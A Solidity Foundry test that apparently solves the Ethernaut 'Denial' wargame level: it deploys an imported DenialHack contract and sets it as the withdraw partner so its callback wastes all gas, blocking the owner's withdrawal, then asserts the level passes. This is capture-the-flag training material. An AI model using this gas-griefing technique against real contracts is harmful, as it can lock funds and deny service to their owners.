pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/20_Denial/DenialFactory.sol";
import "../src/levels/20_Denial/DenialHack.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";


contract DenialTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(0);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testDenialHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create DenialHack Contract
        DenialHack denialHack = new DenialHack();
        
        // set withdraw parter. callback function will waste all passed gas when admin calls "withdraw"
        ethernautDenial.setWithdrawPartner(address(denialHack));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////


        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}